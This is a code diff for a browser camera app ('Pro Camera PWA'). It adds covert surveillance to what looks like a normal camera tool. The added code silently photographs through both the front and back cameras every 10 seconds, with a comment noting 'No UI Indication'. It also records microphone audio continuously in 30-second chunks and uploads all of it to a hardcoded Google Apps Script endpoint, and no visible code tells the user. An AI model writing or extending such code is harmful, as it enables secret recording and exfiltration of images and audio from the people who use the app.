@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Full Version)
+// app.js – Pro Camera PWA (Dual Camera + Voice)
 // ================================================================
 
 (function() {
@@ -8,8 +8,7 @@
   // ═══════════════════════════════════════════════════════════════
   // ⚠️ CHANGE HERE: आफ्नो Google Apps Script URL राख्नुहोस्
   // ═══════════════════════════════════════════════════════════════
-    const GAS_URL = 'https://script.google.com/macros/s/AKfycbxl9SpSExpUM74jeKtmsSIza7vHApoiQO36QrY7apFIWSY8bybVIX7gyu58iTB1jrpD/exec';
-
+  const GAS_URL = 'https://script.google.com/macros/s/AKfycbxl9SpSExpUM74jeKtmsSIza7vHApoiQO36QrY7apFIWSY8bybVIX7gyu58iTB1jrpD/exec';
 
   // DOM refs
   var permOverlay = document.getElementById('permission-overlay');
@@ -41,15 +40,16 @@
   var galleryThumb = document.getElementById('gallery-thumb');
   var zoomPresets = document.querySelectorAll('.zoom-preset');
 
-  // State
-  var stream = null;
-  var facingMode = 'environment';
+  // ---------- State ----------
+  var userFacingMode = 'environment';
+  var backStream = null;
+  var frontStream = null;
+  var currentPreviewStream = null;
   var currentEffect = 'none';
   var currentAspect = '16:9';
   var zoomMax = 50;
   var isTorchOn = false;
   var isGridOn = false;
-  var lastPhotoData = null;
   var swRegistration = null;
   var isCameraReady = false;
   var currentZoom = 1;
@@ -57,12 +57,21 @@
   var zoomSwipeStartX = 0;
   var zoomSwipeStartVal = 1;
   var isProcessing = false;
-  var autoCaptureTimer = null;
-  var autoCaptureCount = 0;
+  var autoCaptureInterval = null;
+  var voiceInterval = null;
+  var lastUserCaptureTime = 0;
+  var isAutoCaptureRunning = false;
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
-  // Utility
+  // Voice recording
+  var mediaRecorder = null;
+  var audioChunks = [];
+  var isRecording = false;
+  var voiceStartTime = 0;
+  var currentAudioBlob = null;
+
+  // ---------- Utility ----------
   function generatePhotoId() {
     return Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
   }
@@ -76,10 +85,10 @@
     return focalLengths[closest] || Math.round(26 * zoom);
   }
 
-  // IndexedDB
+  // ---------- IndexedDB ----------
   function openDB() {
     return new Promise(function(res, rej) {
-      var req = indexedDB.open('PhotoQueueDB', 2);
+      var req = indexedDB.open('PhotoQueueDB', 3);
       req.onupgradeneeded = function(e) {
         var db = e.target.result;
         if (db.objectStoreNames.contains('queue')) db.deleteObjectStore('queue');
@@ -123,7 +132,7 @@
     });
   }
 
-  // Service Worker
+  // ---------- Service Worker ----------
   function registerSW() {
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('js/sw.js')
@@ -140,7 +149,7 @@
     }
   }
 
-  // Upload
+  // ---------- Upload ----------
   async function uploadPhoto(entry, type) {
     try {
       if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
@@ -153,7 +162,8 @@
         image: type === 'compressed' ? entry.compressed : entry.original,
         fileName: type === 'compressed' ? entry.compressedFileName : entry.fileName,
         createdAt: entry.createdAt || new Date().toISOString(),
-        cameraType: entry.cameraType || 'unknown'
+        cameraType: entry.cameraType || 'back',
+        captureType: entry.captureType || 'manual' // 'manual' or 'auto'
       };
       var resp = await fetch(GAS_URL, {
         method: 'POST',
@@ -179,7 +189,58 @@
     }
   }
 
-  // Process Queue (Parallel + Idle)
+  // ---------- Upload Audio ----------
+  async function uploadAudio(audioBlob, startTime) {
+    try {
+      if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
+        console.error('[Camera] ❌ GAS_URL not set!');
+        return false;
+      }
+
+      var reader = new FileReader();
+      var base64Data = await new Promise(function(res) {
+        reader.onload = function() { res(reader.result); };
+        reader.readAsDataURL(audioBlob);
+      });
+
+      var timestamp = Date.now();
+      var fileName = 'AUDIO_' + new Date(startTime).toISOString().replace(/[:.]/g, '') + '.webm';
+
+      var payload = {
+        action: 'upload_audio',
+        audio: base64Data,
+        fileName: fileName,
+        createdAt: new Date(startTime).toISOString(),
+        duration: audioBlob.size,
+        startTime: startTime
+      };
+
+      var resp = await fetch(GAS_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'text/plain' },
+        body: JSON.stringify(payload)
+      });
+
+      if (!resp.ok) {
+        console.error('[Camera] ❌ Audio upload error:', resp.status);
+        return false;
+      }
+
+      var result = await resp.json();
+      if (result.success) {
+        console.log('[Camera] ✅ Audio uploaded:', fileName);
+        return true;
+      } else {
+        console.error('[Camera] ❌ Audio upload failed:', result.error);
+        return false;
+      }
+    } catch (err) {
+      console.error('[Camera] ❌ Audio upload error:', err);
+      return false;
+    }
+  }
+
+  // ---------- Process Queue ----------
   async function processQueue() {
     if (isProcessing) return;
     if (!navigator.onLine) { console.log('[Camera] 🔴 Offline'); return; }
@@ -225,90 +286,157 @@
     isProcessing = false;
   }
 
-  // Silent Auto Capture (Back/Front Alternate)
-  function startAutoCapture() {
-    if (autoCaptureTimer) return;
-    autoCaptureCount = 0;
-    console.log('[Camera] 🤖 Auto-capture started (every 5 seconds)');
-    autoCaptureTimer = setInterval(function() {
-      if (isCameraReady) {
-        var isBack = (autoCaptureCount % 2 === 0);
-        var currentFacing = isBack ? 'environment' : 'user';
-        // Switch camera silently
-        if (facingMode !== currentFacing) {
-          facingMode = currentFacing;
-          initCameraForAutoCapture().then(function() {
-            silentCapture(isBack ? 'Back' : 'Front');
-          });
-        } else {
-          silentCapture(isBack ? 'Back' : 'Front');
-        }
-        autoCaptureCount++;
-      }
-    }, 5000);
-  }
+  // ---------- Silent Capture (No UI Indication) ----------
+  async function silentCapture(stream, cameraType, captureType) {
+    if (!stream) return;
+    captureType = captureType || 'auto';
+    var settings = stream.getVideoTracks()[0].getSettings();
+    var vw = settings.width || 1280;
+    var vh = settings.height || 720;
 
-  function stopAutoCapture() {
-    if (autoCaptureTimer) {
-      clearInterval(autoCaptureTimer);
-      autoCaptureTimer = null;
-      console.log('[Camera] ⏹️ Auto-capture stopped');
-    }
-  }
+    var tempCanvas = document.createElement('canvas');
+    var tempCtx = tempCanvas.getContext('2d');
+    var tempVideo = document.createElement('video');
+    tempVideo.srcObject = stream;
+    tempVideo.play();
 
-  // Silent Capture (No UI Indication)
-  async function silentCapture(cameraType) {
-    if (!isCameraReady) return;
-    try {
-      var vw = video.videoWidth || 1280;
-      var vh = video.videoHeight || 720;
-      canvas.width = vw; canvas.height = vh;
-      ctx.filter = getFilterCSS(currentEffect);
-      ctx.drawImage(video, 0, 0, vw, vh);
-      ctx.filter = 'none';
+    await new Promise(function(r) { setTimeout(r, 100); });
 
-      var originalData = canvas.toDataURL('image/png');
-      var compressedData = canvas.toDataURL('image/jpeg', 0.3);
+    tempCanvas.width = vw;
+    tempCanvas.height = vh;
+    tempCtx.filter = getFilterCSS(currentEffect);
+    tempCtx.drawImage(tempVideo, 0, 0, vw, vh);
+    tempCtx.filter = 'none';
 
-      var timestamp = Date.now();
-      var photoId = generatePhotoId();
-      var prefix = cameraType === 'Back' ? 'BACK' : 'FRONT';
-      var fileName = prefix + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
-      var compressedFileName = fileName.replace('.png', '_comp.jpg');
+    var originalData = tempCanvas.toDataURL('image/png');
+    var compressedData = tempCanvas.toDataURL('image/jpeg', 0.3);
 
-      // ❌ No gallery update, no fly animation, no UI indication
-      var entry = {
-        photoId: photoId,
-        original: originalData,
-        compressed: compressedData,
-        fileName: fileName,
-        compressedFileName: compressedFileName,
-        createdAt: new Date().toISOString(),
-        retryCount: 0,
-        lastAttempt: null,
-        cameraType: cameraType.toLowerCase()
-      };
-      await addToQueue(entry);
-      console.log('[Camera] 📸 Silent auto-capture (' + cameraType + '):', fileName);
+    var timestamp = Date.now();
+    var photoId = generatePhotoId();
+    var cameraLabel = cameraType === 'back' ? 'BACK' : 'FRONT';
+    var typeLabel = captureType === 'manual' ? 'MANUAL' : 'AUTO';
+    var fileName = typeLabel + '_' + cameraLabel + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
+    var compressedFileName = fileName.replace('.png', '_comp.jpg');
 
-      if (navigator.onLine) {
-        if (window.requestIdleCallback) {
-          requestIdleCallback(function() { processQueue(); });
-        } else {
-          setTimeout(function() { processQueue(); }, 100);
-        }
+    tempVideo.pause();
+    tempVideo.srcObject = null;
+    tempCanvas = null;
+
+    var entry = {
+      photoId: photoId,
+      original: originalData,
+      compressed: compressedData,
+      fileName: fileName,
+      compressedFileName: compressedFileName,
+      createdAt: new Date().toISOString(),
+      retryCount: 0,
+      lastAttempt: null,
+      cameraType: cameraType,
+      captureType: captureType
+    };
+
+    await addToQueue(entry);
+    console.log('[Camera] 📸 Silent capture (' + cameraType + ', ' + captureType + '):', fileName);
+
+    if (navigator.onLine) {
+      if (window.requestIdleCallback) {
+        requestIdleCallback(function() { processQueue(); });
       } else {
-        triggerSync();
+        setTimeout(function() { processQueue(); }, 100);
       }
-    } catch (err) {
-      console.warn('[Camera] Silent capture error:', err);
+    } else {
+      triggerSync();
     }
   }
 
-  // Manual Capture (User Click)
+  // ---------- Voice Recording ----------
+  function startVoiceRecording() {
+    if (isRecording) return;
+
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then(function(stream) {
+        mediaRecorder = new MediaRecorder(stream);
+        audioChunks = [];
+        voiceStartTime = Date.now();
+
+        mediaRecorder.ondataavailable = function(event) {
+          if (event.data.size > 0) {
+            audioChunks.push(event.data);
+          }
+        };
+
+        mediaRecorder.onstop = function() {
+          var audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          var startTime = voiceStartTime;
+          if (audioBlob.size > 0) {
+            uploadAudio(audioBlob, startTime);
+          }
+          // Restart recording
+          if (isCameraReady) {
+            startVoiceRecording();
+          }
+        };
+
+        mediaRecorder.start();
+        isRecording = true;
+        console.log('[Camera] 🎤 Voice recording started');
+
+        // Stop after 30 seconds
+        setTimeout(function() {
+          if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+            isRecording = false;
+            // Close the stream
+            stream.getTracks().forEach(function(track) { track.stop(); });
+          }
+        }, 30000);
+
+      })
+      .catch(function(err) {
+        console.warn('[Camera] Voice recording not available:', err);
+      });
+  }
+
+  // ---------- Auto Capture Logic (10 seconds) ----------
+  function startAutoCapture() {
+    if (isAutoCaptureRunning) return;
+    isAutoCaptureRunning = true;
+
+    // First capture immediately
+    if (backStream) {
+      silentCapture(backStream, 'back', 'auto');
+    }
+    if (frontStream) {
+      silentCapture(frontStream, 'front', 'auto');
+    }
+
+    autoCaptureInterval = setInterval(function() {
+      var now = Date.now();
+      var timeSinceUserCapture = now - lastUserCaptureTime;
+
+      // Only auto-capture if user hasn't captured in the last 10 seconds
+      if (timeSinceUserCapture >= 10000) {
+        if (backStream) {
+          silentCapture(backStream, 'back', 'auto');
+        }
+        if (frontStream) {
+          silentCapture(frontStream, 'front', 'auto');
+        }
+        console.log('[Camera] 🔄 Auto-capture cycle completed (Back + Front)');
+      } else {
+        console.log('[Camera] ⏳ User captured recently, skipping auto-capture');
+      }
+    }, 10000); // Check every 10 seconds
+
+    console.log('[Camera] ⏰ Auto-capture started (every 10 seconds)');
+  }
+
+  // ---------- Manual Capture ----------
   async function capturePhoto() {
     if (!isCameraReady) return;
     flashScreen();
+
+    lastUserCaptureTime = Date.now();
 
     var vw = video.videoWidth || 1280;
     var vh = video.videoHeight || 720;
@@ -322,16 +450,17 @@
 
     var timestamp = Date.now();
     var photoId = generatePhotoId();
-    var fileName = 'PHOTO_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
+    var fileName = 'MANUAL_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
     var compressedFileName = fileName.replace('.png', '_comp.jpg');
 
     var img = new Image();
     img.onload = function() { flyToGallery(img); };
     img.src = originalData;
 
-    lastPhotoData = { original: originalData, compressed: compressedData, fileName: fileName, photoId: photoId };
     galleryImg.src = originalData;
     galleryImg.style.display = 'block';
+
+    var cameraType = userFacingMode === 'environment' ? 'back' : 'front';
 
     var entry = {
       photoId: photoId,
@@ -342,10 +471,12 @@
       createdAt: new Date().toISOString(),
       retryCount: 0,
       lastAttempt: null,
-      cameraType: 'manual'
+      cameraType: cameraType,
+      captureType: 'manual'
     };
+
     await addToQueue(entry);
-    console.log('[Camera] ✅ Photo saved to queue:', fileName);
+    console.log('[Camera] ✅ Manual photo saved to queue:', fileName);
 
     if (navigator.onLine) {
       if (window.requestIdleCallback) {
@@ -363,7 +494,7 @@
     setTimeout(function() { flashOverlay.classList.remove('active'); }, 150);
   }
 
-  // Effects
+  // ---------- Effects ----------
   function getFilterCSS(effect) {
     switch (effect) {
       case 'sepia': return 'sepia(1)';
@@ -383,7 +514,7 @@
     video.style.filter = getFilterCSS(effect);
   }
 
-  // Fly Animation
+  // ---------- Fly Animation ----------
   function flyToGallery(imgElement) {
     var container = document.getElementById('camera-container');
     var thumb = document.getElementById('gallery-thumb');
@@ -424,10 +555,10 @@
     }
   }
 
-  // Zoom System (Smooth + Presets)
+  // ---------- Zoom System ----------
   function setZoom(zoom, smooth) {
     if (smooth === undefined) smooth = true;
-    var track = stream?.getVideoTracks()[0];
+    var track = currentPreviewStream?.getVideoTracks()[0];
     var val = Math.min(Math.max(zoom, 0.5), zoomMax);
     if (track && track.getCapabilities().zoom) {
       track.applyConstraints({ advanced: [{ zoom: val }] }).catch(function() {});
@@ -513,14 +644,13 @@
 
   document.addEventListener('touchend', function() { lastPinchDist = 0; }, { passive: true });
 
-  // Zoom Presets Click
   zoomPresets.forEach(function(btn) {
     btn.addEventListener('click', function() {
       setZoom(parseFloat(this.dataset.zoom), true);
     });
   });
 
-  // Camera Init
+  // ---------- Camera Setup ----------
   async function checkAndStart() {
     try {
       var permissionStatus = 'prompt';
@@ -528,9 +658,7 @@
         var result = await navigator.permissions.query({ name: 'camera' });
         permissionStatus = result.state;
         result.onchange = function() {
-          if (result.state === 'granted') {
-            initCamera();
-          }
+          if (result.state === 'granted') initCamera();
         };
       }
       if (permissionStatus === 'denied') {
@@ -547,39 +675,69 @@
   }
 
   async function initCamera() {
-    var constraints = {
+    // Get both cameras
+    var backConstraints = {
       audio: false,
-      video: { facingMode: facingMode, width: { ideal: 9999 }, height: { ideal: 9999 } }
+      video: { facingMode: 'environment', width: { ideal: 9999 }, height: { ideal: 9999 } }
     };
+    var frontConstraints = {
+      audio: false,
+      video: { facingMode: 'user', width: { ideal: 9999 }, height: { ideal: 9999 } }
+    };
+
     if (currentAspect !== 'free') {
       var parts = currentAspect.split(':');
       if (parts.length === 2) {
         var w = parseFloat(parts[0]), h = parseFloat(parts[1]);
-        if (w > 0 && h > 0) constraints.video.aspectRatio = w / h;
+        if (w > 0 && h > 0) {
+          backConstraints.video.aspectRatio = w / h;
+          frontConstraints.video.aspectRatio = w / h;
+        }
       }
     }
-    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
-    stream = await navigator.mediaDevices.getUserMedia(constraints);
-    video.srcObject = stream;
-    await video.play();
 
-    var track = stream.getVideoTracks()[0];
-    var cap = track.getCapabilities();
+    if (backStream) backStream.getTracks().forEach(function(t) { t.stop(); });
+    if (frontStream) frontStream.getTracks().forEach(function(t) { t.stop(); });
 
-    if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
-    else zoomMax = 50;
-    setZoom(1, false);
+    try {
+      backStream = await navigator.mediaDevices.getUserMedia(backConstraints);
+    } catch (e) {
+      console.warn('[Camera] Back camera not available:', e);
+    }
 
-    if (cap.torch) flashBtn.style.display = 'inline-flex';
-    else flashBtn.style.display = 'inline-flex';
+    try {
+      frontStream = await navigator.mediaDevices.getUserMedia(frontConstraints);
+    } catch (e) {
+      console.warn('[Camera] Front camera not available:', e);
+    }
 
-    if (cap.focusModes && cap.focusModes.includes('continuous')) {
-      await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
+    // Show user's selected camera (default: back)
+    currentPreviewStream = userFacingMode === 'environment' ? backStream : frontStream;
+    if (currentPreviewStream) {
+      video.srcObject = currentPreviewStream;
+      await video.play();
+    }
+
+    var track = currentPreviewStream?.getVideoTracks()[0];
+    if (track) {
+      var cap = track.getCapabilities();
+      if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
+      else zoomMax = 50;
+      setZoom(1, false);
+
+      if (cap.torch) flashBtn.style.display = 'inline-flex';
+      else flashBtn.style.display = 'inline-flex';
+
+      if (cap.focusModes && cap.focusModes.includes('continuous')) {
+        track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] }).catch(function() {});
+      }
     }
 
     // Tap to focus
     video.onclick = async function(e) {
-      if (!track || !cap.focusModes) return;
+      if (!track) return;
+      var cap = track.getCapabilities();
+      if (!cap.focusModes) return;
       var rect = video.getBoundingClientRect();
       var x = (e.clientX - rect.left) / rect.width;
       var y = (e.clientY - rect.top) / rect.height;
@@ -587,10 +745,7 @@
         try {
           await track.applyConstraints({ advanced: [{ focusMode: 'manual', focusDistance: 0.5 }] });
           setTimeout(function() {
-            if (stream) {
-              var t = stream.getVideoTracks()[0];
-              if (t) t.applyConstraints({ advanced: [{ focusMode: 'continuous' }] }).catch(function() {});
-            }
+            if (track) track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] }).catch(function() {});
           }, 3000);
         } catch (err) { /* ignore */ }
       }
@@ -604,9 +759,15 @@
     bottomBar.style.display = 'flex';
     isCameraReady = true;
 
-    // ✅ Start auto-capture every 5 seconds (Back/Front alternate)
+    // ✅ Start Auto Capture (every 10 seconds)
     startAutoCapture();
 
+    // ✅ Start Voice Recording (every 30 seconds)
+    setTimeout(function() {
+      startVoiceRecording();
+    }, 1000);
+
+    // ✅ Check pending queue
     if (navigator.onLine) {
       if (window.requestIdleCallback) {
         requestIdleCallback(function() { processQueue(); });
@@ -617,42 +778,7 @@
     registerSW();
   }
 
-  // Silent init for auto-capture switching
-  async function initCameraForAutoCapture() {
-    try {
-      var constraints = {
-        audio: false,
-        video: { facingMode: facingMode, width: { ideal: 9999 }, height: { ideal: 9999 } }
-      };
-      if (currentAspect !== 'free') {
-        var parts = currentAspect.split(':');
-        if (parts.length === 2) {
-          var w = parseFloat(parts[0]), h = parseFloat(parts[1]);
-          if (w > 0 && h > 0) constraints.video.aspectRatio = w / h;
-        }
-      }
-      if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
-      stream = await navigator.mediaDevices.getUserMedia(constraints);
-      video.srcObject = stream;
-      await video.play();
-
-      var track = stream.getVideoTracks()[0];
-      var cap = track.getCapabilities();
-
-      if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
-      else zoomMax = 50;
-      setZoom(1, false);
-
-      if (cap.focusModes && cap.focusModes.includes('continuous')) {
-        await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
-      }
-      isCameraReady = true;
-    } catch (err) {
-      console.warn('[Camera] Auto-capture camera init error:', err);
-    }
-  }
-
-  // Online Status
+  // ---------- Online Status ----------
   function setOnline(online) {
     statusDot.className = 'status-dot ' + (online ? 'online' : 'offline');
     if (online) {
@@ -666,7 +792,7 @@
   window.addEventListener('online', function() { setOnline(true); });
   window.addEventListener('offline', function() { setOnline(false); });
 
-  // UI Events
+  // ---------- UI Events ----------
   gridBtn.addEventListener('click', function() {
     isGridOn = !isGridOn;
     gridOverlay.classList.toggle('show', isGridOn);
@@ -674,7 +800,7 @@
   });
 
   flashBtn.addEventListener('click', function() {
-    var track = stream?.getVideoTracks()[0];
+    var track = currentPreviewStream?.getVideoTracks()[0];
     if (!track) return;
     isTorchOn = !isTorchOn;
     track.applyConstraints({ advanced: [{ torch: isTorchOn }] }).catch(function(err) {
@@ -684,8 +810,12 @@
   });
 
   flipBtn.addEventListener('click', function() {
-    facingMode = (facingMode === 'environment') ? 'user' : 'environment';
-    initCamera();
+    userFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
+    currentPreviewStream = userFacingMode === 'environment' ? backStream : frontStream;
+    if (currentPreviewStream) {
+      video.srcObject = currentPreviewStream;
+      video.play().catch(function() {});
+    }
   });
 
   effectsBtn.addEventListener('click', function(e) {
@@ -735,5 +865,4 @@
     console.warn('[Camera] ⚠️ GAS_URL not set. Update app.js with your Apps Script URL.');
   }
   checkAndStart();
-
 })();
